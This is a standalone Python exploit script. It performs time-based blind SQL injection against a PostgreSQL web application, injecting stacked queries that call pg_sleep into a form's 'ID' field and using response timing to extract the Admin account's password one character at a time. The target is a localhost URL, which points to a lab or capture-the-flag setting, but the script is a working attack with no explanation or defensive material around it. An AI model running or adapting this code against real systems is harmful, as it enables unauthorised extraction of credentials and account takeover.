import requests
import string
import locale
import time
# " and (select length(\"PassWord\") from public.\"user\" where \"UserName\"='thanh')={length}-- 
def get_length(url):
    length = 1
    while True:
        data = {'ID':f"8';SELECT CASE WHEN (select length(\"PassWord\") from public.\"user\" where \"UserName\"='Admin')='{length}' THEN pg_sleep(10) ELSE pg_sleep(0) END--'"}
        start = time.time()
        r = requests.post(url=url,data=data)
        end = time.time()
        during = end-start
        if(during>10):
            print(f'[+] Found length of password: {length}')
            break
        else:
            length+=1
    return length
            
def exploit(url):
    length = get_length(url)
    wordlist = sorted(string.printable[:62])
    locale.setlocale(locale.LC_COLLATE, 'en_US.UTF-8')
    sorted_strings = sorted(wordlist, key=locale.strxfrm)
    password = ''
    for i in range(1,length+1):
        for x in sorted_strings:
            data = {'ID':f"8';SELECT CASE WHEN substr((select \"PassWord\" from public.\"user\" where \"UserName\"='Admin'),{i},1)='{x}' THEN pg_sleep(10) ELSE pg_sleep(0) END--"}
            start = time.time()
            r = requests.post(url=url,data=data)
            end = time.time()
            during = end-start
            if(during>10):
                password += x
                print(f'[+] Found char of password: {x} --> Password: {password}')
                break

if __name__=="__main__":
    start = time.time()
    url = 'http://localhost:8080/T1/index'
    exploit(url=url)    
    end = time.time()
    during = end-start
    print(during)
